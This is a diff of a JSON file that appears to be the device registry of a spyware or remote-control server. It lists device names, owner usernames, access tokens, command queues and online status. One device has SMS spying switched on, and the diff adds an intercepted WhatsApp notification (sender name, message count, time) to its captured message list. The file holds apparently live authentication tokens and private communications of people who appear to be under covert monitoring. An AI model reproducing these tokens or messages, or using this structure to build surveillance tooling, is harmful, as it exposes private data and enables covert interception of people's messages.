@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776922661697,
+    "lastSeen": 1776922670693,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -14068,7 +14068,7 @@
     "deviceName": "HP-RIXX09-D692",
     "ownerUsername": "RIXX09",
     "token": "e6d4d8ffcbd89fb3479c078f0f21f4e6",
-    "lastSeen": 1776922662921,
+    "lastSeen": 1776922669132,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-23T05:33:03.881Z",
@@ -14084,6 +14084,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Teman Mahakam🥶",
+        "content": "‎168 pesan baru",
+        "time": "23/04 13:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922671042
+      },
       {
         "appName": "WhatsApp",
         "sender": "Teman Mahakam🥶",
